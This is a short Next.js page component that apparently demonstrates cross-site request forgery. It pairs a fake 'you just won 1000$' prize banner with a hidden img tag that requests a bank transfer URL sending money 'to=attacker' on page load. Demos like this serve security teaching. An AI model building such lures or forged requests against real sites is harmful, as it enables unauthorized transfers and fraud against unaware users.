"use client";
import Image from "next/image";
import React, { useState, useEffect } from "react";

const colors = [
  "text-red-500",
  "text-green-500",
  "text-blue-500",
  "text-yellow-500",
];
export default function CsrfPage() {
  const [currentColorIndex, setCurrentColorIndex] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentColorIndex((prevIndex) => (prevIndex + 1) % colors.length);
    }, 1000); // Change color every 2 seconds

    return () => clearInterval(interval); // Cleanup on unmount
  }, []);

  return (
    <div className="w-screen min-h-screen bg-black text-white p-10">
      <h1 className="font-semibold text-4xl  flex justify-center pt-10">
        CsrfPage
      </h1>
      {/* <h2 className="font-semibold text-2xl mt-10 text-left">
        in that page I am making an API call and the user dose not know that its
        the call is done on the background , becaue its on the network , that is
        really dangaurous becsuae the user does not aware that its happend
      </h2> */}
      <div>
        <img src="https://bank.com/transfer?to=attacker&amount=1000" />
      </div>

      <div
        className={`font-semibold text-2xl mt-10 flex
             justify-center transition-colors duration-500 ${colors[currentColorIndex]}`}
      >
        {" "}
        Congratulations , you just won 1000$
      </div>
      <div className="flex justify-center">
        <Image alt="prize" src="/prize.avif" width={400} height={400} />
      </div>
    </div>
  );
}
